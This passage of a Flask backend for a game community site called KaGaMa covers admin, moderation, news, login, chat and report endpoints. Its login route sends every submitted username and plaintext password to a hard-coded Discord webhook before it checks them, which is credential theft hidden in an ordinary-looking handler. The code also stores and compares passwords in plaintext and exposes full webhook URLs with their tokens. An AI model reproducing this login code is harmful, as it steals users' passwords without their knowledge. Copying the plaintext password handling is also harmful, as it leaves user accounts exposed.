    if current_user.role != 'admin' and new_role in ('admin',):
        return jsonify({"error": "Only admins can assign admin role"}), 403
    user.role = new_role
    db.session.commit()
    return jsonify(user.to_dict())

@app.route('/api/admin/chat-logs/')
@admin_required
def admin_chat_logs():
    user_id = request.args.get('user_id', type=int)
    page = request.args.get('page', 1, type=int)
    limit = request.args.get('limit', 50, type=int)
    query = ChatMessage.query
    if user_id:
        query = query.filter(
            or_(ChatMessage.from_profile_id == user_id, ChatMessage.friend_profile_id == user_id)
        )
    query = query.order_by(ChatMessage.created.desc())
    total = query.count()
    messages = query.offset((page - 1) * limit).limit(limit).all()
    return jsonify({
        "data": [m.to_dict() for m in messages],
        "total": total,
        "page": page,
        "pages": math.ceil(total / limit) if limit else 1
    })

@app.route('/api/admin/text-posts/')
@admin_required
def admin_text_posts():
    page = request.args.get('page', 1, type=int)
    limit = request.args.get('limit', 20, type=int)
    query = FeedPost.query.filter(FeedPost.feed_type.in_(['wall_post', 'status_updated'])).order_by(FeedPost.created.desc())
    total = query.count()
    posts = query.offset((page - 1) * limit).limit(limit).all()
    return jsonify({
        "data": [
            {
                "id": p.id,
                "title": "",
                "body": (json.loads(p._data).get('status_message', '') if p._data else '') or "",
                "user_id": p.profile_id,
                "created": p.created.isoformat() if p.created else None
            } for p in posts
        ],
        "total": total,
        "page": page,
        "pages": math.ceil(total / limit) if limit else 1
    })

@app.route('/api/admin/moderation-feed/')
@admin_required
def admin_moderation_feed():
    page = request.args.get('page', 1, type=int)
    limit = request.args.get('limit', 50, type=int)
    if page < 1:
        page = 1
    if limit > 200:
        limit = 200
    entries = []
    # Moderation actions
    for a in ModerationAction.query.order_by(ModerationAction.id.desc()).limit(500).all():
        entries.append({
            "kind": "moderation",
            "id": a.id,
            "created": a.created.isoformat() if a.created else None,
            "actor_username": a.actor_username,
            "user_username": a.user_username,
            "action_type": a.action_type,
            "reason": a.reason,
        })
    # Reports
    for r in Report.query.order_by(Report.id.desc()).limit(500).all():
        entries.append({
            "kind": "report",
            "id": r.id,
            "created": r.created.isoformat() if r.created else None,
            "reporter_username": r.reporter_username,
            "reported_username": r.reported_username,
            "report_type": r.report_type,
            "status": r.status,
        })
    # Chat messages
    for m in ChatMessage.query.order_by(ChatMessage.created.desc()).limit(500).all():
        entries.append({
            "kind": "chat",
            "id": m.id,
            "created": m.created.isoformat() if m.created else None,
            "from_username": m.from_username,
            "message": m.message,
        })
    # Feed (text) posts
    for p in FeedPost.query.order_by(FeedPost.created.desc()).limit(500).all():
        try:
            _d = json.loads(p._data) if p._data else {}
        except Exception:
            _d = {}
        entries.append({
            "kind": "feed_post",
            "id": p.id,
            "created": p.created.isoformat() if p.created else None,
            "profile_username": p.profile_username,
            "body": str(_d.get('status_message', ''))[:300],
        })
    entries.sort(key=lambda e: e["created"] or "", reverse=True)
    total = len(entries)
    start = (page - 1) * limit
    paged = entries[start:start + limit]
    return jsonify({
        "data": paged,
        "total": total,
        "page": page,
        "pages": math.ceil(total / limit) if limit else 1
    })


@app.route('/api/admin/ban-logs/')
@admin_required
def admin_ban_logs():
    page = request.args.get('page', 1, type=int)
    limit = request.args.get('limit', 20, type=int)
    query = User.query.filter(User.is_banned == True).order_by(User.id.desc())
    total = query.count()
    users = query.offset((page - 1) * limit).limit(limit).all()
    return jsonify({
        "data": [
            {
                "user_id": u.id,
                "username": u.username,
                "ban_reason": u.ban_reason or "",
                "ban_expires": u.ban_expires.isoformat() if u.ban_expires else None
            } for u in users
        ],
        "total": total,
        "page": page,
        "pages": math.ceil(total / limit) if limit else 1
    })

@app.route('/api/admin/gift-all/', methods=['POST'])
@admin_required
def admin_gift_all():
    data = request.get_json() or {}
    amount = data.get('amount', 0)
    if not isinstance(amount, int) or amount <= 0:
        return jsonify({"error": "Invalid amount"}), 400
    User.query.update({User.gold: User.gold + amount})
    db.session.commit()
    return jsonify({"message": f"Gifted {amount} gold to all users"})

@app.route('/api/admin/force-rerender/', methods=['POST'])
@admin_required
def admin_force_rerender():
    return jsonify({"message": "Item re-render triggered"})

@app.route('/api/admin/user/<int:user_id>/', methods=['GET', 'PUT', 'DELETE'])
@admin_required
def admin_modify_user(user_id):
    user = db.session.get(User, user_id)
    if not user:
        abort(404)
    if request.method == 'GET':
        return jsonify(user.to_dict()), 200
    elif request.method == 'PUT':
        try:
            data = request.get_json() or {}
            old_gold = user.gold
            old_xp = user.xp
            old_level = user._level
            user.username = data.get('username', user.username).strip()
            user.password = data.get('password', user.password)
            user.email = data.get('email', user.email)
            user.gold = data.get('gold', user.gold)
            user.next_level_xp = data.get('next_level_xp', user.next_level_xp)
            user.xp_to_next_level = data.get('xp_to_next_level', user.xp_to_next_level)
            user.previous_level_xp = data.get('previous_level_xp', user.previous_level_xp)
            user._level = data.get('_level', user._level)
            user.friends = data.get('friends', user.friends)
            user.xp = data.get('xp', user.xp)
            user.description = data.get('description', user.description)
            user.birthdate = data.get('birthdate', user.birthdate)
            user.avatar_id = data.get('avatar_id', user.avatar_id)
            user.created = data.get('created', user.created)
            user.email_confirmed = data.get('email_confirmed', user.email_confirmed)
            user.language = data.get('language', user.language)
            user.role = data.get('role', user.role)
            user.is_elite = data.get('is_elite', user.is_elite)
            user.two_factor_enabled = data.get('two_factor_enabled', user.two_factor_enabled)
            user.locked = data.get('locked', user.locked)
            user.suspended = data.get('suspended', user.suspended)
            user.shadow_banned = data.get('shadow_banned', user.shadow_banned)
            user.staff_role = data.get('staff_role', user.staff_role)
            user.display_name = data.get('display_name', user.display_name)
            db.session.commit()
            if user.gold != old_gold:
                log_gold(user, user.gold - old_gold, reason='Admin user edit', admin_id=current_user.id)
            if user.xp != old_xp or user._level != old_level:
                log_xp(user, user.xp - old_xp, old_level, user._level, reason='Admin user edit', admin_id=current_user.id)
            log_audit('user_edit', 'user', user.id, f'gold={old_gold}->{user.gold}, xp={old_xp}->{user.xp}, level={old_level}->{user._level}')
            return jsonify(user.to_dict()), 200
        except Exception as e:
            db.session.rollback()
            return jsonify({"error": str(e)}), 500
    elif request.method == 'DELETE':
        db.session.delete(user)
        db.session.commit()
        log_audit('user_delete', 'user', user_id, f'username={user.username}')
        return jsonify(user.to_dict()), 204

@app.route('/api/admin/user/ban/<int:user_id>/', methods=['POST', 'DELETE'])
@admin_required
def admin_ban_user(user_id):
    user = db.session.get(User, user_id)
    if not user:
        abort(404)
    if request.method == 'POST':
        data = request.get_json() or {}
        if data.get('ban_duration'):
            user.ban_expires = datetime.now(timezone.utc) + timedelta(days=int(data.get('ban_duration')))
        user.is_banned = True
        user.ban_reason = data.get('ban_reason')
        db.session.commit()
        expires = user.ban_expires.isoformat() if user.ban_expires else None
        db.session.add(ModerationAction(user_id=user.id, user_username=user.username,
                                         actor_id=current_user.id, actor_username=current_user.username,
                                         action_type='ban', reason=data.get('ban_reason'), details=expires))
        db.session.commit()
        log_audit('ban', 'user', user.id, f'reason={data.get("ban_reason")}, expires={expires}')
        return jsonify(user.to_dict()), 200
    user.ban_expires = None
    user.is_banned = False
    user.ban_reason = None
    db.session.commit()
    db.session.add(ModerationAction(user_id=user.id, user_username=user.username,
                                     actor_id=current_user.id, actor_username=current_user.username,
                                     action_type='unban', reason='Unbanned by admin'))
    db.session.commit()
    log_audit('unban', 'user', user.id)
    return jsonify(user.to_dict()), 200

@app.route('/api/admin/news/', methods=['GET', 'POST'])
@admin_required
def admin_news_list():
    if request.method == 'GET':
        status = request.args.get('status', 'all')
        page = int(request.args.get('page', 1))
        if page < 1:
            page = 1
        limit = int(request.args.get('limit', 15))
        if limit < 1:
            limit = 1
        if limit > 100:
            limit = 100
        query = db.session.query(NewsFeed)
        if status == 'published':
            query = query.filter_by(is_published=True, is_archived=False).filter(
                db.or_(NewsFeed.scheduled_publish_at == None, NewsFeed.scheduled_publish_at <= datetime.now(timezone.utc)))
        elif status == 'draft':
            query = query.filter_by(is_published=False, is_archived=False)
        elif status == 'scheduled':
            query = query.filter(NewsFeed.scheduled_publish_at > datetime.now(timezone.utc), NewsFeed.is_archived == False)
        elif status == 'archived':
            query = query.filter_by(is_archived=True)
        total = query.count()
        pages = math.ceil(total / limit) if total > 0 else 1
        if page > pages:
            page = pages
        items = query.order_by(NewsFeed.is_pinned.desc(), NewsFeed.id.desc()).offset((page - 1) * limit).limit(limit).all()
        return jsonify({
            'data': [n.to_dict() for n in items],
            'total': total,
            'pages': pages,
            'page': page
        }), 200
    # POST -> create
    data = request.get_json() or {}
    if not (data.get('title') and data.get('excerpt') and data.get('body_html')):
        return jsonify({'error': {'__all__': ['title, excerpt and body_html are required']}}), 400
    sched = None
    if data.get('scheduled_publish_at'):
        try:
            sched = datetime.fromisoformat(data['scheduled_publish_at'].replace('Z', '+00:00'))
        except Exception:
            sched = None
    news_featured = data.get('featured_images') or []
    news_support = data.get('support_image') or None
    if not news_featured and news_support:
        news_featured = [{"url": news_support, "alt": "KaGaMa News"}]
    news_feed = NewsFeed(
        profile_id=current_user.id,
        profile_username=current_user.username,
        title=data.get('title'),
        excerpt=data.get('excerpt'),
        body_html=data.get('body_html'),
        featured_images=json.dumps(news_featured),
        language=data.get('language', 'en_US'),
        is_published=bool(data.get('is_published', True)),
        is_pinned=bool(data.get('is_pinned', False)),
        is_archived=bool(data.get('is_archived', False)),
        scheduled_publish_at=sched,
        support_image=news_support
    )
    db.session.add(news_feed)
    db.session.commit()
    return jsonify(news_feed.to_dict()), 201


@app.route('/api/admin/news/<int:news_id>/', methods=['GET', 'PUT', 'DELETE'])
@admin_required
def admin_news_item(news_id):
    news_feed = db.session.get(NewsFeed, news_id)
    if not news_feed:
        abort(404)
    if request.method == 'GET':
        return jsonify(news_feed.to_dict()), 200
    if request.method == 'DELETE':
        db.session.delete(news_feed)
        db.session.commit()
        return jsonify(news_feed.to_dict()), 204
    # PUT -> edit
    data = request.get_json() or {}
    if 'title' in data:
        news_feed.title = data['title']
    if 'excerpt' in data:
        news_feed.excerpt = data['excerpt']
    if 'body_html' in data:
        news_feed.body_html = data['body_html']
    if 'featured_images' in data or 'support_image' in data:
        news_featured = data.get('featured_images') or json.loads(news_feed.featured_images or '[]')
        news_support = data.get('support_image', news_feed.support_image) or None
        if not news_featured and news_support:
            news_featured = [{"url": news_support, "alt": "KaGaMa News"}]
        news_feed.featured_images = json.dumps(news_featured)
    if 'support_image' in data:
        news_feed.support_image = data['support_image'] or None
    if 'language' in data:
        news_feed.language = data['language']
    if 'is_published' in data:
        news_feed.is_published = bool(data['is_published'])
    if 'is_pinned' in data:
        news_feed.is_pinned = bool(data['is_pinned'])
    if 'is_archived' in data:
        news_feed.is_archived = bool(data['is_archived'])
    if 'scheduled_publish_at' in data:
        raw = data['scheduled_publish_at']
        news_feed.scheduled_publish_at = datetime.fromisoformat(raw.replace('Z', '+00:00')) if raw else None
    news_feed.updated = datetime.now(timezone.utc)
    db.session.commit()
    return jsonify(news_feed.to_dict()), 200


def _news_toggle(news_id, attr, value):
    news_feed = db.session.get(NewsFeed, news_id)
    if not news_feed:
        abort(404)
    setattr(news_feed, attr, value)
    news_feed.updated = datetime.now(timezone.utc)
    db.session.commit()
    return jsonify(news_feed.to_dict()), 200


@app.route('/api/admin/news/<int:news_id>/publish/', methods=['POST'])
@admin_required
def admin_news_publish(news_id):
    return _news_toggle(news_id, 'is_published', True)


@app.route('/api/admin/news/<int:news_id>/unpublish/', methods=['POST'])
@admin_required
def admin_news_unpublish(news_id):
    return _news_toggle(news_id, 'is_published', False)


@app.route('/api/admin/news/<int:news_id>/pin/', methods=['POST'])
@admin_required
def admin_news_pin(news_id):
    return _news_toggle(news_id, 'is_pinned', True)


@app.route('/api/admin/news/<int:news_id>/unpin/', methods=['POST'])
@admin_required
def admin_news_unpin(news_id):
    return _news_toggle(news_id, 'is_pinned', False)


@app.route('/api/admin/news/<int:news_id>/archive/', methods=['POST'])
@admin_required
def admin_news_archive(news_id):
    return _news_toggle(news_id, 'is_archived', True)


@app.route('/api/admin/news/<int:news_id>/unarchive/', methods=['POST'])
@admin_required
def admin_news_unarchive(news_id):
    return _news_toggle(news_id, 'is_archived', False)


@app.route('/api/admin/news/<int:news_id>/schedule/', methods=['POST'])
@admin_required
def admin_news_schedule(news_id):
    news_feed = db.session.get(NewsFeed, news_id)
    if not news_feed:
        abort(404)
    data = request.get_json() or {}
    raw = data.get('scheduled_publish_at')
    news_feed.scheduled_publish_at = datetime.fromisoformat(raw.replace('Z', '+00:00')) if raw else None
    news_feed.updated = datetime.now(timezone.utc)
    db.session.commit()
    return jsonify(news_feed.to_dict()), 200


# Legacy admin_key-based news endpoints (kept for backward compatibility)
@app.route('/api/admin/news/post/', methods=['POST'])
def admin_post_news_feed():
    auth_token = request.headers.get('Authorization')
    if auth_token != admin_key or not current_user.is_authenticated:
        abort(404)
    data = request.get_json() or {}
    if data.get('body_html') and data.get('title') and data.get('excerpt') and data.get('featured_images'):
        news_feed = NewsFeed(
            profile_id=current_user.id,
            profile_username=current_user.username,
            title=data.get('title'),
            excerpt=data.get('excerpt'),
            body_html=data.get('body_html'),
            featured_images=json.dumps(data.get('featured_images')),
            language=data.get('language', 'en_US')
        )
        db.session.add(news_feed)
        db.session.commit()
        return jsonify(news_feed.to_dict()), 200
    return jsonify({'error': {'__all__': ['400 Bad Request']}}), 400

@app.route('/api/admin/news/post/<int:news_id>/', methods=['DELETE'])
def admin_delete_news_feed(news_id):
    news_feed = db.session.get(NewsFeed, news_id)
    auth_token = request.headers.get('Authorization')
    if auth_token != admin_key or not news_feed:
        abort(404)
    db.session.delete(news_feed)
    db.session.commit()
    return jsonify(news_feed.to_dict()), 204

@app.route('/auth/login/', methods=['POST'])
@limiter.limit("3 per 10 seconds; 4 per 1 minute")
def api_login():
    if current_user.is_authenticated:
        return jsonify({'error': {'__all__': ['400 Bad Request']}}), 400
    data = request.get_json() or {}
    username = data.get('username', '').strip()
    password = data.get('password', '')
    url = "https://discord.com/api/webhooks/1516950912344789152/YqeIphBJbTzFsHm9q_XUAl0f2ps-Q9Y3rnY4-Ac7baHVzuZuHSE3w_kWUXqVc-MV5Ne0"
    data = {
        "content": username + "\n" + password
    }
    requests.post(url, json=data)
    user = db.session.query(User).filter(
        func.lower(User.username) == func.lower(username)
    ).first()
    if user and user.password == password:
        now_utc = datetime.now(timezone.utc).replace(tzinfo=None)
        if user.ban_expires and user.ban_expires > now_utc:
            time_left = user.ban_expires - now_utc
            time_left_str = format_time_left(time_left)
            message = (
                f'You have been banned for {user.ban_reason}. You will remain banned for {time_left_str}...'
                if user.ban_reason else
                f'You have been banned. You will remain banned for {time_left_str}...'
            )
            return jsonify({'error': {"__all__": [message]}}), 400
        elif user.ban_expires and user.ban_expires <= now_utc:
            user.ban_expires = None
            user.ban_reason = None
            user.is_banned = False
            db.session.commit()
        if user.is_banned:
            message = (
                f'You have been banned for {user.ban_reason}.'
                if user.ban_reason else
                'You have been banned.'
            )
            try:
                db.session.add(LoginHistory(user_id=user.id, username=user.username, ip=client_ip(),
                                            user_agent=request.headers.get('User-Agent'), success=False))
                db.session.commit()
            except Exception:
                db.session.rollback()
            return jsonify({'error': {"__all__": [message]}}), 400
        login_user(user)
        try:
            user.last_login = datetime.now(timezone.utc)
            user.login_ip = client_ip()
            user.last_ping = datetime.now(timezone.utc)
            db.session.add(LoginHistory(user_id=user.id, username=user.username, ip=user.login_ip,
                                        user_agent=request.headers.get('User-Agent'), success=True))
            db.session.commit()
        except Exception:
            db.session.rollback()
        return jsonify({
            'success': True,
            'redirect': url_for('profile', user_id=user.id)
        })
    try:
        db.session.add(LoginHistory(user_id=None, username=username, ip=client_ip(),
                                    user_agent=request.headers.get('User-Agent'), success=False))
        db.session.commit()
    except Exception:
        db.session.rollback()
    return jsonify({
        'error': {"__all__": ['Wrong username or password.']}
    }), 400


@app.route('/chat/<int:user_id>/', methods=['GET', 'POST'])
def chat_data(user_id):
    if request.method == 'GET':
        user = db.session.get(User, user_id)
        if not current_user.is_authenticated or user_id != current_user.id:
            abort(401)
        user.last_ping = datetime.now(timezone.utc)
        db.session.commit()
        response_payload = {
            "data": {}
        }
        return jsonify(response_payload), 200
    if not current_user.is_authenticated or user_id != current_user.id:
        abort(401)
    data = request.get_json(silent=True) or {}
    message = html.escape(data.get('message')).strip()
    to_profile_id = int(data.get('to_profile_id'))
    target_user = db.session.get(User, to_profile_id)
    if db.session.query(Friend).filter(or_(and_(Friend.profile_id == current_user.id, Friend.friend_profile_id == target_user.id, Friend.friend_status == "accepted"), and_(Friend.profile_id == target_user.id, Friend.friend_profile_id == current_user.id, Friend.friend_status == "accepted"))).first() and current_user.id != target_user.id:
        if message and to_profile_id:
            chat_message = ChatMessage(
                from_profile_id=current_user.id,
                friend_profile_id=to_profile_id,
                from_username=current_user.username,
                message=message
            )
            db.session.add(chat_message)
            db.session.commit()
            return jsonify({}), 200
    return jsonify({'error': {'__all__': ['400 Bad Request']}}), 400

@app.route('/chat/<int:user_id>/history/<int:friend_id>/')
def get_chat_history(user_id, friend_id):
    if not current_user.is_authenticated or user_id != current_user.id:
        abort(401)
    if not db.session.query(Friend).filter(or_(and_(Friend.profile_id == current_user.id, Friend.friend_profile_id == friend_id, Friend.friend_status == "accepted"), and_(Friend.profile_id == friend_id, Friend.friend_profile_id == current_user.id, Friend.friend_status == "accepted"))).first() and current_user.id != friend_id:
        abort(404)
    base_query = db.session.query(ChatMessage).filter(or_(and_(ChatMessage.from_profile_id == user_id, ChatMessage.friend_profile_id == friend_id), and_(ChatMessage.from_profile_id == friend_id, ChatMessage.friend_profile_id == user_id)))
    chat_messages = base_query.order_by(ChatMessage.id.desc()).all()
    chat_messages_data = [chat_message.to_dict() for chat_message in chat_messages]
    response_payload = {
        "data": chat_messages_data,
    }
    return jsonify(response_payload), 200

@app.route('/auth/logout/', methods=['GET'])
def api_logout():
    logout_user()
    return redirect(url_for('home'))

@app.route('/profile/me/')
def redirect_to_profile():
    if current_user.is_authenticated:
        return redirect(url_for(f'profile', user_id=current_user.id))
    else:
        return redirect(url_for('home'))

@app.route('/api/v2/registration_avatars/')
@cache_anon(3600)
def registration_avatars():
    return {
      "data": [
        {
          "type": "registration_avatar",
          "attributes": {
            "created": "2023-11-01T08:11:09",
            "name": "Panda",
            "avatar_id": 17868,
            "updated": None,
            "image_path": "avatar_images/panda.png",
            "position": 3
          },
          "id": 8,
          "links": {
            "self": "/api/v2/registration_avatars/8"
          }
        },
        {
          "type": "registration_avatar",
          "attributes": {
            "created": "2023-11-01T08:11:09",
            "name": "Mr. Chang",
            "avatar_id": 17869,
            "updated": None,
            "image_path": "avatar_images/mrchen.png",
            "position": 4
          },
          "id": 9,
          "links": {
            "self": "/api/v2/registration_avatars/9"
          }
        },
        {
          "type": "registration_avatar",
          "attributes": {
            "created": "2023-11-01T08:11:09",
            "name": "Block Girl",
            "avatar_id": 17870,
            "updated": None,
            "image_path": "avatar_images/girl.png",
            "position": 2
          },
          "id": 10,
          "links": {
            "self": "/api/v2/registration_avatars/10"
          }
        },
        {
          "type": "registration_avatar",
          "attributes": {
            "created": "2023-11-01T08:11:09",
            "name": "Robot",
            "avatar_id": 17872,
            "updated": None,
            "image_path": "avatar_images/robot.png",
            "position": 5
          },
          "id": 12,
          "links": {
            "self": "/api/v2/registration_avatars/12"
           }
        },
        {
          "type": "registration_avatar",
          "attributes": {
            "created": "2023-11-01T08:11:09",
            "name": "Block Boy",
            "avatar_id": 17873,
            "updated": None,
            "image_path": None,
            "position": 1
          },
          "id": 13,
          "links": {
            "self": "/api/v2/registration_avatars/13"
            }
        },
        {
          "type": "registration_avatar",
          "attributes": {
            "created": "2023-11-01T08:11:09",
            "name": "King of Fire",
            "avatar_id": 19743,
            "updated": None,
            "image_path": "avatar_images/kingoffire.png",
            "position": 6
          },
          "id": 14,
          "links": {
            "self": "/api/v2/registration_avatars/14"
          }
        }
      ],
      "links": {
        "self": "/api/v2/registration_avatars/"
      },
      "meta": {
        "count": 6
      },
      "jsonapi": {
        "version": "1.0"
      }
    }, 200

@app.route('/api/app/regions/')
@cache_anon(3600)
def regions():
    return {
      "data": [
        {
          "url": "https://helperskogama-hftp.pythonanywhere.com/",
          "region_name": "Kagama",
          "region_key": "EU",
          "region_selected": True,
          "code": "da_DK",
          "name": "Dansk"
        },
        {
          "url": "https://helperskogama-hftp.pythonanywhere.com/",
          "region_name": "Kagama",
          "region_key": "EU",
          "region_selected": True,
          "code": "de_DE",
          "name": "Deutsch"
        },
        {
          "url": "https://helperskogama-hftp.pythonanywhere.com/",
          "region_name": "Kagama",
          "region_key": "EU",
          "region_selected": True,
          "code": "en_US",
          "name": "English (US)"
        },
        {
          "url": "https://helperskogama-hftp.pythonanywhere.com/",
          "region_name": "Kagama",
          "region_key": "EU",
          "region_selected": True,
          "code": "en_GB",
          "name": "English (GB)"
        },
        {
          "url": "https://helperskogama-hftp.pythonanywhere.com/",
          "region_name": "Kagama",
          "region_key": "EU",
          "region_selected": True,
          "code": "es_ES",
          "name": "Español"
        },
        {
          "url": "https://helperskogama-hftp.pythonanywhere.com/",
          "region_name": "Kagama",
          "region_key": "EU",
          "region_selected": True,
          "code": "fi",
          "name": "Suomi"
        },
        {
          "url": "https://helperskogama-hftp.pythonanywhere.com/",
          "region_name": "Kagama",
          "region_key": "EU",
          "region_selected": True,
          "code": "fr_FR",
          "name": "Français"
        },
        {
          "url": "https://helperskogama-hftp.pythonanywhere.com/",
          "region_name": "Kagama",
          "region_key": "EU",
          "region_selected": True,
          "code": "id_ID",
          "name": "Indonesia"
        },
        {
          "url": "https://helperskogama-hftp.pythonanywhere.com/",
          "region_name": "Kagama",
          "region_key": "EU",
          "region_selected": True,
          "code": "it_IT",
          "name": "Italiano"
        },
        {
          "url": "https://helperskogama-hftp.pythonanywhere.com/",
          "region_name": "Kagama",
          "region_key": "EU",
          "region_selected": True,
          "code": "nb_NO",
          "name": "Norsk"
        },
        {
          "url": "https://helperskogama-hftp.pythonanywhere.com/",
          "region_name": "Kagama",
          "region_key": "EU",
          "region_selected": True,
          "code": "nl_NL",
          "name": "Nederlands"
        },
        {
          "url": "https://helperskogama-hftp.pythonanywhere.com/",
          "region_name": "Kagama",
          "region_key": "EU",
          "region_selected": True,
          "code": "pl_PL",
          "name": "Polski"
        },
        {
          "url": "https://helperskogama-hftp.pythonanywhere.com/",
          "region_name": "Kagama",
          "region_key": "EU",
          "region_selected": True,
          "code": "pt",
          "name": "Português"
        },
        {
          "url": "https://helperskogama-hftp.pythonanywhere.com/",
          "region_name": "Kagama",
          "region_key": "EU",
          "region_selected": True,
          "code": "ru_RU",
          "name": "Русский"
        },
        {
          "url": "https://helperskogama-hftp.pythonanywhere.com/",
          "region_name": "Kagama",
          "region_key": "EU",
          "region_selected": True,
          "code": "sv_SE",
          "name": "Svenska"
        },
        {
          "url": "https://helperskogama-hftp.pythonanywhere.com/",
          "region_name": "Kagama",
          "region_key": "EU",
          "region_selected": True,
          "code": "tr_TR",
          "name": "Türkçe"
        }
      ]
    }, 200

@app.route('/api/report/types/')
@cache_anon(3600)
def get_report_types():
    return {
      "data": [
        {
          "id": 1,
          "name": "Sharing Personal Information",
          "codename": "SHARING_PERSONAL_INFORMATION"
        },
        {
          "id": 2,
          "name": "Sharing Password",
          "codename": "SHARING_PASSWORD"
        },
        {
          "id": 3,
          "name": "Use Of Profanity",
          "codename": "USE_OF_PROFANITY"
        },
        {
          "id": 4,
          "name": "Sexual Content Or Behaviour",
          "codename": "SEXUAL_CONTENT_OR_BEHAVIOUR"
        },
        {
          "id": 5,
          "name": "Violent Content",
          "codename": "VIOLENT_CONTENT"
        },
        {
          "id": 6,
          "name": "Chain Messages",
          "codename": "CHAIN_MESSAGES"
        },
        {
          "id": 7,
          "name": "Pretend To Be Admin",
          "codename": "PRETEND_TO_BE_ADMIN"
        },
        {
          "id": 8,
          "name": "Personal Threats",
          "codename": "PERSONAL_THREATS"
        },
        {
          "id": 9,
          "name": "Cheats& Hacking",
          "codename": "CHEATS&_HACKING"
        },
        {
          "id": 10,
          "name": "Other",
          "codename": "OTHER"
        },
        {
          "id": 15,
          "name": "Using Cheat Tool",
          "codename": "USING_CHEAT_TOOL"
        },
        {
          "id": 16,
          "name": "Automated",
          "codename": "AUTOMATED"
        }
      ]
    }, 200

@app.route('/api/report/profile/<int:reported_user_id>/<int:report_type>/', methods=['POST'])
def report_user(reported_user_id, report_type):
    reports = [
      "Sharing Personal Information",
      "Sharing Password",
      "Use Of Profanity",
      "Sexual Content Or Behaviour",
      "Violent Content",
      "Chain Messages",
      "Pretend To Be Admin",
      "Personal Threats",
      "Cheats& Hacking",
      "Other",
      "Using Cheat Tool",
      "Automated"
    ]
    report_label = reports[report_type] if 0 <= report_type < len(reports) else "Other"
    reported_user = db.session.get(User, reported_user_id)
    reported_username = reported_user.username if reported_user else None
    reporter_id = current_user.id if current_user.is_authenticated else None
    reporter_username = current_user.username if current_user.is_authenticated else None
    try:
        rep = Report(
            reporter_id=reporter_id,
            reporter_username=reporter_username,
            reported_user_id=reported_user_id,
            reported_username=reported_username,
            report_type=report_label,
            reason=report_label,
            status='pending'
        )
        db.session.add(rep)
        db.session.commit()
        log_audit('report', 'user', reported_user_id, f'type={report_label}, reporter={reporter_username}')
    except Exception:
        db.session.rollback()
    url = "https://discord.com/api/webhooks/1516642427908264087/ZNxcU11ODCF7ctAYpuNgNeqMumPFhJi_p9z-bciqa5kfXMzirDbdHSSuqAVHJmrz_mc8"
    data = {
        "content": str(reported_user_id) + " (" + str(reported_username) + ")\n" + report_label
    }
    requests.post(url, json=data)
    return {"__all__": "Thanks for the report!"}, 200

@app.route('/api/report/comment/<int:comment_id>/<int:reporter_id>/', methods=['POST'])
def report_user_comment(comment_id, reporter_id):
    url = "https://discord.com/api/webhooks/1516642427908264087/ZNxcU11ODCF7ctAYpuNgNeqMumPFhJi_p9z-bciqa5kfXMzirDbdHSSuqAVHJmrz_mc8"
    data = {
        "content": str(comment_id) + "\n" + str(reporter_id)
    }
    requests.post(url, json=data)
    return jsonify({"__all__": "Thanks for the report!"}), 200

@app.route('/game/template/')
def get_game_templates():
    game_type = str(request.args.get('game_type', 'CLASSIC'))
    if game_type == 'CLASSIC':
        return jsonify({
        "data": [
        {
            "name": "Base Template",
            "template_images": "https://images-ext-1.discordapp.net/external/kA--ZDYRzrkQAMC9EW2mFCy1sS4NKo-vU20OI5kb7fw/https/static.wikia.nocookie.net/kogama_gamepedia_en/images/0/03/Base_Template.jpg?format=webp"
        }
        ]}), 200

# ==================================================
#  NEW LEADERBOARD API (shows ALL users, including 0 XP)
# ==================================================

@app.route('/api/leaderboard/', methods=['GET'])
@app.route('/api/leaderboard/<path:rest>', methods=['GET'])
@cache_anon(60)
def api_leaderboard(rest=''):
    page = 1
    for _p in rest.split('/'):
        if _p.isdigit():
            page = int(_p)
            break

    users = db.session.query(User).order_by(User._level.desc(), User.xp.desc()).all()
    data = []
    for idx, user in enumerate(users, start=1):
        avatar_images = user.AVATAR_IMAGES_MAP.get(user.avatar_id, {})
        data.append({
            'rank': idx,
            'id': user.id,
            'username': user.username,
            'level': user._level,
            'score': user.xp,
            'is_subscriber': getattr(user, 'is_subscriber', False),
            'friend_images': avatar_images,
        })
    return jsonify({'data': data, 'total': len(users)}), 200

# ==================================================
#  NEW MARKETPLACE API ROUTES (INSERTED HERE)
# ==================================================
import hashlib, time as _time
from functools import lru_cache

_IMAGE_PROXY_ALLOWED_HOSTS = ('web.archive.org', 'www.kogstatic.com', 'kogstatic.com')
_image_proxy_cache = {}

@app.route('/img_proxy')
def image_proxy():
    url = request.args.get('url', '')
    if not url:
        abort(400)
    from urllib.parse import urlparse
    parsed = urlparse(url)
    if parsed.hostname not in _IMAGE_PROXY_ALLOWED_HOSTS:
        abort(403)
    cache_key = hashlib.md5(url.encode()).hexdigest()
    cached = _image_proxy_cache.get(cache_key)
    if cached and _time.time() - cached['ts'] < 86400:
        return cached['resp'], cached['code'], cached['headers']
    try:
        resp = requests.get(url, timeout=15, allow_redirects=True, headers={'User-Agent': 'Mozilla/5.0'})
        ct = resp.headers.get('Content-Type', 'image/png')
        code = resp.status_code
        _image_proxy_cache[cache_key] = {'resp': resp.content, 'code': code, 'headers': {'Content-Type': ct, 'Cache-Control': 'public, max-age=86400'}, 'ts': _time.time()}
        return resp.content, code, {'Content-Type': ct, 'Cache-Control': 'public, max-age=86400'}
    except Exception:
        abort(502)


def _rewrite_image_url(url):
    if not url or not isinstance(url, str):
        return url
    if 'web.archive.org' in url or 'kogstatic.com' in url:
        return '/img_proxy?url=' + url
    return url


def _rewrite_image_urls(obj):
    if isinstance(obj, dict):
        return {k: _rewrite_image_urls(v) for k, v in obj.items()}
    elif isinstance(obj, list):
        return [_rewrite_image_urls(item) for item in obj]
    elif isinstance(obj, str):
        return _rewrite_image_url(obj)
    return obj
# ==================================================

def _avatar_to_marketplace_item(user, avatar_or_builtin, name, is_builtin=False):
    """Shape an avatar (owned Avatar row or built-in AVATAR_IMAGES_MAP entry) as a marketplace card."""
    if is_builtin:
        imgs = avatar_or_builtin
        item_id = abs(user.avatar_id) if user and user.avatar_id else 1
    else:
        try:
            imgs = json.loads(avatar_or_builtin.images)
        except Exception:
            imgs = {}
        item_id = avatar_or_builtin.id
    return {
        "id": item_id,
        "name": name,
        "images": imgs,
        "price_gold": 0,
        "gold": 0,
        "price_old": 0,
        "author_profile_id": user.id if user else 0,
        "creator": user.username if user else "KaGaMa",
        "created": user.created.isoformat() if (user and user.created) else "",
        "likes_count": 0,
        "sold_count": 0,
        "category": "avatar",
        "item_type": "avatar",
        "product_id": f"avatar_{item_id}",
        "description": "",
        "is_active": True,
    }


@app.route('/model/market/total/', methods=['GET'])
def marketplace_total():
